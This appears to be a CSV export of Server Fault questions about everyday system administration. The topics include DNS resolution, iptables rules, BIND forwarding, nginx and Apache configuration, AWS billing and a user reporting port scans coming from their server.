","<networking><ethernet><network-speed>","2016-02-24 09:03:16"
"759419","How to RCA a DNS strange behavior","<p>Suddenly 3 of my domains stopped working and browser complained that <strong>ERR_NAME_NOT_RESOLVED</strong>.</p>

<p>I started debugging on Windows, to find out where the problem might be. I used <code>nslookup</code> and <code>set debug</code> and changed the server to <code>8.8.8.8</code> (Google's Public DNS service).</p>

<p>I see a very strange behavior:</p>

<ol>
<li>8.8.8.8 returns NXDOMAIN => non-existent domain</li>
<li>Browser again shows the site (I use chrome)</li>
<li>One of these 3 domains shows this URL => <em>earchguide.level3.com/search/</em> when I write it like <code>http://domain/</code> in chrome.</li>
<li>Again browser shows <em>ERR_NAME_NOT_RESOLVED</em></li>
<li>Once in every X tries of <code>nslookup domain 8.8.8.8</code> resolves the IP</li>
</ol>

<p>This behavior makes me worried, and I'm not a DNS professional. I know about it, but I need help to find out:</p>

<ol>
<li>Whether I'm under attack or not</li>
<li>Where the problem might be and how to fix it</li>
</ol>

<p>Any help is appreciated, and I don't know what more information do you need. Please guide and I'll provide.</p>
","<domain-name-system><dns-hosting>","2016-02-24 10:36:27"
"759458","Cannot use browser on server PC","<p>I have a (Delphi-Indy based) custom server running on a dedicated PC. It used to listen on port 80 but on later versions of Windows that port is already assigned, so now I use port 8080.
My clients insist that HTTP traffic is on port 80. Therefor I instruct the LAN router to forward external traffic on port 80 to LAN port 8080 of the server PC.
This works fine.
However, now I cannot access internet via Chrome or IE on this server PC (which is a bit of a nuisance since for certain tasks, like checking upload speed, that would be helpful).
I sort of understand that: if these browsers get their response on external port 80, then the reponse will get to my server rather than the browser.
a) Am I correct with this explanation?
b) Is there a way to circumvent this conflict?
Thanks</p>
","<port><forwarding>","2016-02-24 14:30:43"
"759517","Windows CE 5.0 - 6.0 RDP to Windows server 2012 R2","<p>I have installed Windows server 2012 RDS license on a new Windows server 2012 R2 machine. We need the ability to RDP in from mobile handhelds (Motorola mc 9090 and mc 9100) running  CE 5.0 and 6.0. When I try and RDP in I get an error message ""Internal error has occurred"" on the handhelds.</p>

<p>After some research I found that it's due the the server using a SHA2 or 2048-bit certificate. Does anyone know of any workarounds for this?  </p>
","<rds>","2016-02-24 17:42:32"
"759656","Load balancer requirements","<p>I have got two dedicated servers with apache installed as their webserver. How can I implement load balancing on my servers in a way that if a a server is out of service or has a problem the other one is replaced?</p>

<p>Is there any hardware or software requirement? Should I ask my server administrator to do something?</p>
","<load-balancing>","2016-02-25 07:45:44"
"759660","When does a Debian server require restart?","<p>I have Debian 8.3 installed on my vServer, hosting websites and other applications. For instance, my VM didn't boot properly after my hoster rebooted the node. So there must be something that gets loaded only on complete reboot.</p>

<p>What are scenarios where I have to reboot the server?`</p>

<ul>
<li>apt-get upgrade - when libraries get updated?</li>
<li>apt-get upgrade - when a new image is installed?</li>
<li>other reasons?</li>
</ul>

<p><strong>Or is a Debian server something that you simply don't have to reboot, ever?</strong></p>
","<linux><debian><apt><debian-jessie>","2016-02-25 08:05:52"
"977429","disk information for KVM VPS","<p>Is there a way to determine if a local disk in a kvm vps is hosted on local storage  or a remote?
I need to find if the disk of my kvm vps on hosted on local's hypervisor's disk array or via a remote storage.</p>
","<hard-drive><vps>","2019-07-31 14:10:29"
"759760","Daily Cost to run Dell Power Edge R900 and HP DL580 G5","<p>I have these two servers Dell Power Edge R900 and HP DL580 G5 both 4 Xeon Quad Cores and 128GB RAM loaded with Hard Drives 8 x 2.5 on DL580 and 5 3.5 in R900</p>

<p>R900 Using 1570 Watt Power Supply
DL580 Using 1200 Watt Power Supply</p>

<p>How much are they costing me to run 24 x 7?</p>

<p>I do understand that power usage changes based on the load but still just looking for rough worst case example</p>

<p>Please let me know what other information i can provide to help me calculate this</p>

<p>My electricity cost is $0.11 / KW</p>
","<electrical-power><power-supply-unit><usage>","2016-02-25 14:06:28"
"759797","Deleting folder with rm -rf","<p>I have a folder which name is <code>photo</code> and it is 13gb. I checked my HDD space with <code>df -h</code> command and it said you have 50GB free space. Then I deleted my <code>photo</code> folder with <code>rm -rf photo/</code> command. It deleted instantly. Now I am checking free space again with <code>df -h</code> command and it still says you have 50GB free space.</p>

<p>When I try to reach my <code>photo</code> folder i am getting</p>

<pre><code>No such file or directory
</code></pre>

<p>Warning.</p>

<p>What can be cause to this problem? I am using Centos 6.5 x64</p>
","<linux><centos><ssh>","2016-02-25 16:21:23"
"759936","HP ML350p Gen8 won't boot from PCIe SSD","<p>I have a HP ML350p Gen8 with a PCIe SSD and I'm trying to boot from it, but it won't do it. I can see the PCIe SSD in the list of hard drives when to choose where to install windows 10 pro, but after I install windows, it would give an error about missing some files. I tried it on a couple occasions with different BIOS settings, but no luck. Did anyone install windows on a PCIe SSD on a ML350p? Thank you</p>
","<windows><boot><ssd><pci-express>","2016-02-26 04:26:45"
"759940","Why can't I restart my Apache Amazon EC2 server?","<p>I'm trying to restart my amazon EC2 Apache server, and I'm getting an error message that says</p>

<blockquote>
  <p>(13)Permission denied: AH00058: Error retrieving pid file /var/run/httpd/httpd.pid
  AH00059: Remove it before continuing if it is corrupted.</p>
</blockquote>

<p>I'm trying to restart it using <code>apachectl graceful</code>.</p>

<hr>

<p>Can't post an image due to rep, but here's exactly what Terminal is showing:</p>

<pre><code>Last login: Thu Feb 25 21:53:05 on ttys001
Jeffs-MacBook-Pro:~ jeffArries$ ssh -i /Users/jeffArries/Desktop/jeffarries.pem ec2-user@ec2-54-213-219-247.us-west-2.compute.amazonaws.com
Last login: Fri Feb 26 05:53:07 2016 from 71.83.110.240

       __|  __|_  )
       _|  (     /   Amazon Linux AMI
      ___|\___|___|

https://aws.amazon.com/amazon-linux-ami/2015.09-release-notes/
[ec2-user@ip-172-31-31-54 ~]$ apachectl graceful
(13)Permission denied: AH00058: Error retrieving pid file /var/run/httpd/httpd.pid
AH00059: Remove it before continuing if it is corrupted.
[ec2-user@ip-172-31-31-54 ~]$ 
</code></pre>

<p>Thanks for your effort!</p>
","<amazon-ec2><amazon-web-services><apache-2.4><terminal>","2016-02-26 06:03:19"
"759979","Why can't linux password start with '#'","<p>My password for temporary things and testing was something like:</p>

<blockquote>
  <p>#password123</p>
</blockquote>

<p>On Windows everything worked fine, but when I started working with Linux distros (tested at least on CentOS, Debian, Ubuntu), after setting any password that started with '#' I simply couldn't log in any more.</p>

<p>What really happens behind the scenes to prevent having this kind of password? </p>

<p>My first idea was '#' is ussualy comment, it comments what follows, but everything is hashed and salted which immediately rejects my idea.</p>
","<linux><password><login>","2016-02-26 09:31:19"
"760072","Please explain the statement, ""Containers are lightweight...you can run thousands on a server...""","<p>In much of the hype around containers I often hear statements such as:</p>

<blockquote>
  <p>Linux containers are very lightweight...you can potentially run
  thousands of them on a single server...</p>
</blockquote>

<p>I understand that by definition containers share the kernel of the underlying OS and that the containers <em>themselves</em> (the container daemons) are lightweight but it's not as if someone is going to fire up a thousand empty containers.  There'll be database processes, web servers, jobs of all types running inside the containers and these all have whatever are their typical memory/working set requirements.  So how is the statement about being able to run thousands of containers a practical consideration?</p>
","<virtualization><virtual-machines><docker><containers>","2016-02-26 16:58:06"
"760129","What is a TCP Relay and when is it used?","<p><em>Tcprelay is a TCP connection forwarder with load balancing capabilities. If compiled with TLS support, it may be used as SSL encryption wrapper.</em></p>

<p>What are some practical applications of TCP relay? </p>
","<tcp><udp>","2016-02-26 20:18:19"
"760162","EC2 pricing for multiple stop-start within the same hour","<p>In <a href=""http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/Stop_Start.html"" rel=""nofollow noreferrer"">http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/Stop_Start.html</a>, it says,</p>

<blockquote>
  <p>Each time you start a stopped instance we charge a full instance hour, even if you make this transition multiple times within a single hour.</p>
</blockquote>

<p>Does this mean if within the same hour, I stopped-start my instance for 5x, I will be charged for 5 hours?</p>

<p>Thanks!</p>
","<amazon-ec2><amazon-web-services><start>","2016-02-27 01:29:17"
"760241","Microsoft Azure Hosting Servers","<p>I currently have a Microsoft Azure subscription. Since this platform offers VMs, I thought to myself ""Why not try to make a hosting company and sell these VMs from one big server?""</p>

<p>So there's my question, is it possible to host multiple VMs from one VM in Azure? If so, how would i do this...? A brief description will do if it's possible!</p>
","<vps><azure>","2016-02-27 20:37:20"
"760415","Should I use SSL on SSH","<p>I am trying to setup a web server in Linux (Debian).</p>

<p>I have modified the IP tables to provide access only SSH and HTTP/S.</p>

<p>Also SSH port has been changed to non-standard one.</p>

<p>Apart from these steps, should I be using some sort of SSL while connecting to SSH or SSH is secure by nature?</p>
","<linux><ssh><debian><ssl>","2016-02-29 07:04:28"
"760516","How to open entire subnet with iptables","<p>I want to enable the entire subnet 192.168.1.0/24 which is connected to eth0 in input. I'm very unfamiliar with iptables.</p>

<p>If I add the rule:</p>

<pre><code># iptables -A INPUT -s 192.168.1.0/24 -p tcp -m tcp --dport 45678 -j ACCEPT
</code></pre>

<p>it works on ONE port. But we want all ports open to our subnet (both tcp and udp), so I tried:</p>

<pre><code># iptables -A INPUT -i eth0 -j ACCEPT
</code></pre>

<p>But it fails (no error, we simply cannot connect). What is the correct syntax ?</p>
","<iptables><tcp><subnet>","2016-02-29 15:54:47"
"760607","Using the FileSystem provider","<p>I need to use the FileSystem provider and using an appropriate cmdlet, create a zero-lenght file name C:\Zero.txt.  I know I need to use New-Item within it.</p>

<p>Any ideas?</p>
","<powershell>","2016-03-01 00:08:06"
"760692","How we can see SElinux policies running on a centos system??","<p>I am given with an assignment that how we can see what selinux policies are running on a system(centos), as i am a new and dont know about the system</p>
","<centos><selinux>","2016-03-01 10:59:23"
"760711","why all hard drives in a HPC cluster must be of the same size and part number?","<p>One of the hard drives of my HPCC is broken and I have to buy another one. I've heard it must be of the exactly same size and part number. Could anyone explain me why?</p>

<p>Thanks</p>
","<raid><hard-drive><hpc>","2016-03-01 12:21:48"
"760798","NTP server in windows 2012","<p>I am a bit confused..I installed MS server 2012 on machine and I added it to domain..Over this 2012 server I installed active directory for test purpose.. Then I configured w32tm over domain controller over MS server 2012 and every thing fine.. But, I found litter another NTP server was configured on my network and clients resync from it.. It was the PDC..</p>

<p>my question is: How Can I force client to take time from my NTP server, not from PDC??</p>
","<windows-server-2012-r2><ntp>","2016-03-01 18:11:47"
"760858","Can a Dell T110 II Tower server handle the stress of running a website?","<p>Just like the subject line says. I've got a website built on C# with SQL Server back end. I'd like to run my own server so I have more control over what I can and can't put on it. It's not going to be Google, but it may get a couple thousand hits per day if I'm lucky. I've got a static IP and a 100MB line leased.</p>

<p>Looking for a reasonably inexpensive server and the Dell T110 II can be had for under $1K. I just want to know if this is realistic, or if it would be a complete waste of money to go this route.</p>

<p>Also, what are recommended minimums for RAM, CPU and such?</p>
","<web-server>","2016-03-01 23:46:43"
"760914","How to set BIND9 with the ability to resolve internal domain addresses (CentOS)","<p>I have some problem. I have a domain controller on windows server 2003 with dns server. IP that dns is: 192.168.110.5. For example, i have some computers with names: guard-01.piduna.pp.ua. ""piduna.pp.ua"" – my domain. I have a gateway to internet on CentOS 6.7. In my configuration, i have: two interfaces (lan and wan), FORWARDING and NAT. That is my resolv.conf:</p>

<pre><code>cat /etc/resolv.conf
nameserver 195.69.138.130
nameserver 195.69.138.141
search piduna.pp.ua
</code></pre>

<p>I can't resolve local domain names, because i have only nameservers of my ISP.
When, i add nameserver 192.168.110.5 (dns of windows server), i can ping local ip-adresses and resolve it. But i don't want, that in my gateway (CentOS) stand first nameserver, DNS from Windows Server. 
I make on my CentOS caching DNS (forwarding and caching nameserver of my ISP). My config:</p>

<pre><code>acl ""lan"" {
           192.168.0.0/16;
           172.16.170.0/24;
           127.0.0.1;
};

options {
           directory ""/var/cache/bind"";
           forward first;              

           forwarders {                
                      195.69.138.130;      // first dns of provider
                      195.69.138.141;      // second dns of provider
           };

          listen-on { lan; };        
          allow-query { lan; };      
          allow-recursion { lan; };  
          allow-transfer { none; }; 
          version ""unknown"";        
          auth-nxdomain no;    
          listen-on-v6 { none; };   
          };

zone ""."" {
          type hint;
          file ""db.root"";
};

zone ""localhost"" {
          type master;
          file ""localhost"";
};

zone ""127.in-addr.arpa"" {
          type master;
          file ""127.in-addr.arpa"";
};

zone ""0.in-addr.arpa"" {
          type master;
          file ""0.in-addr.arpa"";
};

zone ""255.in-addr.arpa"" {
          type master;
          file ""255.in-addr.arpa"";
};
</code></pre>

<p>Ok, when i add in resolv.conf, 127.0.0.1 – my caching server work fine. But, how to add my domain zone in that config ? I want check ping from my gateway (CentOS) to  local domain names. For example, i can ping 192.168.110.25, but i cant ping guard-01.piduna.pp.ua. How to do that ? How to resolve local domain names on my gateway (CentOS). Google said, that i need add slave zone, but i not find how to do that. Please help and thanks for your attention. </p>
","<domain-name-system><centos><windows-server-2003><bind><dns-zone>","2016-03-02 07:53:09"
"761057","Can't open port","<p>I can't open port 25 and 587. Background information: I am running CentOS 7 with firewalld and httpd. Now I want to run a mailserver. I started with installing postfix. Then I added firewall rules for the ports 25 and 587. This is the output of <code>iptables -nvL IN_public_allow</code>:</p>

<pre><code>Chain IN_public_allow (1 references)
pkts bytes target     prot opt in     out     source                   destination
1    60 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:80 ctstate NEW
3   180 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:25 ctstate NEW
2   112 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:22 ctstate NEW
1    52 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:443 ctstate NEW
0     0 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:587 ctstate NEW
</code></pre>

<p>But I can't use telnet to test postfix. I checked twice with this little tool: <a href=""http://www.yougetsignal.com/tools/open-ports/"" rel=""nofollow noreferrer"">http://www.yougetsignal.com/tools/open-ports/</a>
SSH, HTTP/HTTPS are open, 25 and 587 are not.</p>

<p>These are two lines of my log:</p>

<pre><code>Mar 02 17:53:30 MyServer postfix/smtp[2099]: connect to mydomain.com[fdd6:7e90:ec71:be65:b3d]:25: Network is unreachable
Mar 02 17:53:30 MyServer postfix/smtp[2099]: connect to mydomain.com[4.2.67.123]:25: Connection refused
</code></pre>

<p>What is my problem? I thought of SELinux. How can I investigate this further?</p>
","<centos><postfix><firewall><smtp><selinux>","2016-03-02 17:23:02"
"977740","invalid server name or wildcard in a virtual host in nginx","<p>I have the following virtual host configuration for nginx in a virtual host:</p>

<pre><code>server {
        listen 80 default_server;
        listen [::]:80 default_server;

        server_name angularindepth.com
        rewrite ^/(.*)$ https://blog.angularindepth.com/$1 redirect;
}
</code></pre>

<p>But when I run nginx it gives me the following errors:</p>

<blockquote>
  <ul>
  <li>[warn] 5007#5007: server name ""^/(.*)$"" has suspicious symbols in ...</li>
  <li>[warn] 5007#5007: server name ""<a href=""https://blog.angularindepth.com/"" rel=""nofollow noreferrer"">https://blog.angularindepth.com/</a>$1"" has suspicious symbols in ...</li>
  <li>[emerg] 5007#5007: invalid server name or wildcard ""^/(.*)$"" on
  0.0.0.0:80</li>
  </ul>
</blockquote>

<p>I've googled and all questions seem to be around <code>server_name</code> directive, whereas in my case it contains a proper name. The problem seems to be with <code>rewrite</code> directive. Am I right? What's the problem?</p>
","<nginx><web-server>","2019-08-02 14:04:26"
"852469","Allow https access only on Apache?","<p>I want to allow https only on my Apache server on Raspbian, but every time I try to edit the ports.conf in /ect/apache2/ to listen to Port 443 and the sites-available/000-default.conf to:</p>

<pre><code>&lt;VirtualHost *:443&gt;
</code></pre>

<p>the server doesn't restart anymore and the log tells me this:</p>

<pre><code>You configured HTTP(80) on the standard HTTPS(443) port!
</code></pre>

<p>Is there anything I'm missing to edit?</p>
","<ssl><apache-2.4>","2017-05-26 17:10:46"
"932194","Change reset password window","<p>How can I change the Reset Password window in login side to different window?
If someone will click to Reset Password then my window would appear where users can change their password after they answered to security questions.
<a href=""https://i.sstatic.net/TrsMv.png"" rel=""nofollow noreferrer"">Login page with Reset password text</a></p>

<p>I saw this method in my school but with Windows 7. I want to do this in Windows 10.
Thank you in advance the responses. :)</p>
","<windows><active-directory>","2018-09-22 18:47:11"
"932321","Small Office Server Provisioning Recommendations (Hyper-V or Metal)","<p>I'll be setting up a new network for my small software dev team, and I have a question about how to best set up the servers.</p>

<p>The requirements are:</p>

<ul>
<li>Active Directory (and DNS) for local network</li>
<li>File Services for local network</li>
<li>DHCP for local network</li>
<li>Routing and Remote Access for local network access remotely</li>
<li>Exchange Server 2016 for business email</li>
<li>Hyper-V VMs for some Linux web servers (development and testing environments only)</li>
</ul>

<p>Would it be best to set up a Hyper-V host, and then provision a VM to run AD + DNS + DHCP + RRAS + File Services, another VM to run Exchange, and then any other Linux VMs required?</p>

<p>Or, would it be best to provision a separate physical machine to take care of AD + DNS + DHCP + RRAS + File Services, and have only Exchange and the Linux machines running under Hyper-V?</p>

<p>Any suggestions would be much appreciated. Thanks.</p>
","<windows><hyper-v><windows-server-2016>","2018-09-24 05:07:58"
"977934","Does redhat system admin and engineering certificate (RHCSA) and (RHCE) work for all Unix-like operating systems?","<p>Does redhat system admin and engineering certificate (RHCSA) and (RHCE) work for all Unix-like operating systems? or
Can a Redhat Engineer or System admin work for a debian based companies or systems?</p>
","<linux><debian><redhat><unix><sysadmin>","2019-08-04 23:04:11"
"932335","Windows server fail over clustering between two seperated server","<p>i have two windows server with speared location,hard and SQL server. 
how i configure failover between them (IIS and SQL Server)? is there any scenario for this ?
is it better to use shared storage ?</p>

<p>also there is no way to implement and use Active Directory.</p>

<p>thanks</p>
","<windows><sql><high-availability><failover>","2018-09-24 07:42:05"
"761242","Port scan attacks detected from my server","<p>I have dedicated server for my personal projects on Hetzner and today was the second time I got email from them informing that they detected portscan coming from server (first time was in January). At the time I've read the email and logged in to the server it looked perfectly ok without any weird activity going on. I did some rootkit detection scans but with no luck. </p>

<p>What are my next steps here? Should I just ignore it, do clean system install or sth else?</p>
","<ubuntu><security><attacks><port-scanning>","2016-03-03 08:44:46"
"932374","Unknown site using jquery and css file but include my site path","<p>This is my site URL - <a href=""https://www.thecodedeveloper.com"" rel=""nofollow noreferrer"">https://www.thecodedeveloper.com</a></p>

<p>But this Unknown site <a href=""http://newnuk.com/dialio/Web_doctor/viewinfo/139"" rel=""nofollow noreferrer"">http://newnuk.com/dialio/Web_doctor/viewinfo/139</a> </p>

<p>means i am not owner of this site</p>

<p>But once i view source this page <a href=""http://newnuk.com/dialio/Web_doctor/viewinfo/139"" rel=""nofollow noreferrer"">http://newnuk.com/dialio/Web_doctor/viewinfo/139</a> 
then i found on this page include below files</p>

<p>https://www.thecodedeveloper.com/wp-content/themes/publisher-child/css/jquery.datetimepicker.min.css?ver=4.9.8' type='text/css' media='all' /></p>



<p>these files path coming from my site.</p>

<p>I want to know:
1) Is that effect my site speed ?
2) how can i stop it ? </p>

<p>Thanks</p>
","<php><wordpress><css><jquery>","2018-09-24 14:00:21"
"761276","AWS - Understanding DataTransfer","<p>In my <strong>AWS Billing &amp; Cost Management Dashboard</strong>, I can see under <strong>DataTransfer->Bandwidth</strong> this line:</p>

<p><strong>$0.010 per GB - regional data transfer - in/out/between EC2 AZs or using IPs or ELB</strong></p>

<p>This costs <strong>~1500$ every month</strong>. And I would like to understand what this means.
Nobody able to explain and AWS docs unfortunately do not understandable.</p>

<p>Could somebody please explain what is it?</p>

<p>My architecture is pretty simple:
Auto-scaled environment with a load balancer and one RDS database in multi-zone (AZ), S3 bucket for storage and CloudFront for static content delivery.</p>

<p>Thanks.</p>
","<amazon-web-services>","2016-03-03 12:08:02"
"761277","Is it possible to use a ftps server (NAS) to use as a virtual hard drive in VMware vSphere Hypervisor, if so, how?","<p>The title explains most of it. Basically, let's say I have a NAS(I don't). I want to allow another computer to use it as storage for a virtual machine on VMware vSphere Hypervisor. The software on the NAS will most likely be QTS by QNAP.</p>
","<virtualization><virtual-machines><vmware-vsphere><network-attached-storage><ftps>","2016-03-03 12:09:02"
"932399","How to simulate pressing Enter?","<p>I have this in my bash script:</p>

<pre><code>ENV_VAR1=123 nohup my_app &amp;
</code></pre>

<p>When I run, it prints this</p>

<pre><code>$ nohup: appending output to 'nohup.out'
# &lt;here is a new line&gt;
</code></pre>

<p>and expects me to press Enter so that it'll present me again the promt for continuing entering commands. After I press Enter, I endeed get this:</p>

<pre><code>$ 
</code></pre>

<p>How can I simulate pressing Enter <strong>in my bash script</strong>?</p>
","<linux><bash>","2018-09-24 16:42:38"
"761343","MX Records and A Records Updated But Email Addresses Can Still Send Email","<p>I have updated the MX Records, the A records, the Z records and the cname for a particular domain but the emails registered with the hosting provider can still send email. The changes have definitely propagated since the mail boxes can no longer receive email.</p>

<p>Why can these email addresses still send outgoing email? The test messages I've sent to my google account say ""encryption:  name_of_hosting_provider.com did not encrypt this message"".</p>

<p>I need these email addresses disabled, unable to send or receive email.</p>
","<mx-record><cname-record>","2016-03-03 15:03:54"
"932507","How to make right redirect from www ssl to non-www ssl using NGINX?","<p>I'm using NGINX and I have ssl cert for example.com
And I don't have ssl cert for www.example.com.</p>

<p><strong>In brief:</strong>
I tried to configure NGINX to redirect from all the www requests to non-www (from <code>**http**://www.example.com</code> and <code>**https**://www.example.com</code> to <code>https://example.com</code>).
Nevertheless I used a tone of different answers to more or less similiar questions, I get either no result or the server stops answering :(</p>

<p>That was the problem in general, now I'll dive into details:</p>

<p>Now my NGINX config looks like:</p>

<pre><code>upstream puma_example_production { 
  server unix:/var/www/example/shared/tmp/sockets/puma.sock fail_timeout=0;
}

#server {
#    listen 80;
#    listen 443 ssl;
#    server_name www.example.com;
#    return 301 https://example.com$request_uri;
#}


server {
  listen 80;
  listen 443 ssl;
  ssl on;
  ssl_certificate /var/certs/ssl.crt;
  ssl_certificate_key /var/certs/sslkey.key;

  server_name example.com;
  root /var/www/example/current/public;
  try_files $uri/index.html $uri @puma_example_production;

  client_max_body_size 4G;
  keepalive_timeout 10;

  error_page 500 502 504 /500.html;
  error_page 503 @503;

  # return   301 https://example.com$request_uri;

  location @puma_example_production {
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header Host $host;
    proxy_redirect off;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection ""Upgrade"";
    proxy_set_header X-Forwarded-Proto https;
    proxy_pass http://puma_example_production;
    # limit_req zone=one;
    access_log /var/www/example/shared/log/nginx.access.log;
    error_log /var/www/example/shared/log/nginx.error.log;
  }

  location ^~ /assets/ {
    gzip_static on;
    expires max;
    add_header Cache-Control public;
  }

  location = /50x.html {
    root html;
  }

  location = /404.html {
    root html;
  }

  location @503 {
    error_page 405 = /system/maintenance.html;
    if (-f $document_root/system/maintenance.html) {
      rewrite ^(.*)$ /system/maintenance.html break;
    }
    rewrite ^(.*)$ /503.html break;
  }

  if ($request_method !~ ^(GET|HEAD|PUT|PATCH|POST|DELETE|OPTIONS)$ ){
    return 405;
  }

  if (-f $document_root/system/maintenance.html) {
    return 503;
  }
}
</code></pre>

<p>I commented the lines with approaches which cause errors.
Now  I have proper server work for non-www requests, but with www requests I get browser warning that I have no ssl cert (NET::ERR_CERT_COMMON_NAME_INVALID) (and that's true).</p>

<p>I hope that there's the right way to redirect from www to non-www. Could youhelp me out, please?</p>
","<nginx><ssl>","2018-09-25 09:20:29"
"761404","AWS: Public vs. Private Subnets for multi-tiered web applications","<p>Is there a recommended ""best practice"" for deploying multi-tiered web applications into AWS as it relates to public and private subnets?  Most of the documentation, including AWS' suggest public for ELB and EC2, with private for RDS.  But I've also seen it suggested that public for ELB and all web and database servers in private.</p>
","<amazon-ec2><amazon-web-services><subnet>","2016-03-03 18:51:06"
"978126","How many people can a normal laptop server serve?","<p>I'm just trying to play around with my laptop by hosting a small WordPress blog on that. I wonder how many people it can serve at once.</p>

<p>About the network, I've tested on Speedtest.net and got this result:
<a href=""https://www.speedtest.net/result/8478472643"" rel=""nofollow noreferrer"">https://www.speedtest.net/result/8478472643</a></p>

<p>About the hardware, it runs on Windows 10 Pro 64bit, Intel Core i5-7200U, 8GB of RAM, and 1TB Samsung QVO SSD.</p>
","<windows><load-testing><laptop>","2019-08-06 11:36:14"
"761414","Cloudlinux + CageFS + PHP Selector - how to update default php.ini for each PHP version or for each domain account?","<p>My server runs Cloudlinux 5.11 with CageFS and PHP Selector. Default PHP version is 5.3.</p>

<p>I have one account using PHP 5.3, one account using PHP 5.5, and one account using PHP 5.6.</p>

<p>I'm trying to figure out how to update each account's php.ini or each PHP version's default php.ini.</p>

<p>So far I've figured out how to update PHP 5.3's default php.ini:</p>

<ol>
<li><p><code>phpinfo</code> on the PHP 5.3 account shows the loaded configuration file is from <code>/usr/selector.etc/php.ini</code>.</p></li>
<li><p>Update /usr/local/lib/php.ini</p></li>
<li><p>Run <code>cagefsctl --force-update</code></p></li>
<li><p>Rebuild Apache</p></li>
</ol>

<p>Then the modified <code>/usr/local/lib/php.ini</code> is reflected on the <code>phpinfo</code>.</p>

<p>However, for PHP 5.5. and 5.6 accounts, I can't figure out how to update their default php.ini's.</p>

<ol>
<li><p>Their <code>phpinfo</code> shows the loaded configuration files are from <code>/opt/alt/php55/etc/php.ini</code> and <code>/opt/alt/php56/etc/php.ini</code></p></li>
<li><p>Update those files</p></li>
<li><p>Run <code>cagefsctl --force-update</code></p></li>
<li><p>Rebuild Apache</p></li>
</ol>

<p>Afterwards, the changes of these php.ini's are reverted! So where is the right place to change these PHP versions' default php.ini's?</p>

<p>Being able to update each PHP version's default php.ini would work for me, but it would be even easier and more flexible if each domain account (or even each folder) can have its own php.ini.</p>

<p>I've tried <code>/public_html/php.ini</code> and <code>/public_html/.htaccess</code>. They don't take effect at all. <code>ini_set</code> in script works though, but of course I don't want to reply on just <code>ini_set</code>.</p>
","<centos><php><php.ini><cpanel><cloudlinux>","2016-03-03 20:00:41"
"761432","Maximum HD space on VMware","<p>What is the maximum physical HD space I can put on ESXI 6 server? I want to purchase 24 qty 4 TB Hard Drives. Thanks.</p>

<p>Already bought an Areca 24 sas raid</p>
","<vmware-esx>","2016-03-03 21:16:40"
"852844","When I click `l` in the Windows 2008, the system will locked, but not type out the `l`","<p>I use MICROSOFT REMOTE DESKTOP to connect the windows 2008 server in my mac.
When I click <code>l</code> in the Windows 2008, the system will locked, but not type out the <code>l</code>.</p>

<p>The picture is after I click the <code>l</code> keyboard.
<a href=""https://i.sstatic.net/Nuzik.jpg"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/Nuzik.jpg"" alt=""enter image description here""></a></p>
","<windows-server-2008>","2017-05-29 15:28:40"
"852856","In a domain, how does one transfer files from one PC to another?","<p>I googled it and all I got was how to transfer files from one domain to another domain.</p>

<p>Say I have two PCs, one running windows server 2008 and the other running Windows 7, they're connected via a LAN, and they're part of the same domain.</p>

<p>How do you send a file from one PC to the other?</p>

<p>Why the heck isn't there some simple function where you right click a file and select <strong>send</strong>?</p>
","<domain><file-transfer>","2017-05-29 17:34:22"
"932603","Is it worth bothering writing Cloudformation if Terraform exists?","<p>Sometimes CloudFormation can be too ""complicated"".</p>

<p>Which cases should CloudFormation win over Terraform?</p>
","<amazon-web-services><amazon-cloudformation><terraform>","2018-09-25 18:17:31"
"932626","Why do people use 172.x.x.x instead of 192.x.x.x","<p>Since I was a kid, I've always installed our home network with the default 192.168.1.x/24, but whenever i log into my university's network, i notice that they use 172.x.x.x, and the same thing goes for most public places I've connected to before. So, i wonder if this is a standard that people follow ?</p>

<p>PS: <strong>i'm a noob</strong> </p>
","<networking><ip><ip-address>","2018-09-25 20:10:41"
"932652","How to execute 2 scripts on a server via ssh by chaining them and within only a single connection?","<p>I have these 2 commands that I send to my server:</p>

<pre><code>- cat ./script1.sh var1 var2 | ssh my_user@my_server.com
- cat ./script2.sh var3 var4 | ssh my_user@my_server.com
</code></pre>

<p>This is a part of Gitlab CI, but this doesn't matter.</p>

<p>Is there any way to merge these 2 lines -- execute script1.sh and then script2.sh on a server? So that they'll execute within a <em>single</em> ssh connection. </p>

<p>Preferably without having to create an additional 3rd script that'll call those 2.</p>
","<linux><ssh><bash><scripting>","2018-09-25 22:37:11"
"761513","RAID5 recreate without loosing data or recovery","<p>I have problem with RAID5 failed. Intel Matrix Storage on Asus motherboard</p>

<p>The configuration was
- 500 GB NON RAID (System C partition)
- 1 TB - RAID 5 with 3 hard drive  (System D partition)
Main problem is that before failure - array was in rebuilding state. One hard drive failed, but all data are accessible.</p>

<p>After scan all hard drive with MHDD (disconnecting and connecting to another computer) the RAID show three hard drive as non member and one as RAID 5 failed array. I don't know why - I don't run these drive on other computer with other operating system - only MHDD.</p>

<ol>
<li>It's possible to recreate RAID 5 in CTRL+I Intel Matrix BIOS without lossing data?</li>
<li>It's anybody known that create RAID5 init structure and always overwrite data?</li>
<li>It's better to delete array and then try to recovery matrix? </li>
</ol>

<p>I tried with TestDisk but it can't read 1TB partition.</p>

<p>Thanks for answers</p>
","<raid5>","2016-03-04 08:25:09"
"761520","Why does Intel have multiple Linux USB vendor IDs?","<p>From <code>/usr/share/hwdata/usb.ids</code>, on my system, Intel Corp. seems to have multiple USB vendor IDs:</p>

<pre><code># cat /usr/share/hwdata/usb.ids | grep 'Intel Corp'
042b  Intel Corp.
8086  Intel Corp.
8087  Intel Corp.
</code></pre>

<p>Why ?</p>
","<linux><usb><intel>","2016-03-04 09:13:26"
"932700","what is the difference between normal 2012 server and r2 versions","<p>what is the difference between normal 2012 server and r2 versions.
Is there any speciality on r2 versions
For eg: windows 2012 standard and windows 2012 standard R2</p>
","<windows-server-2008-r2>","2018-09-26 07:01:45"
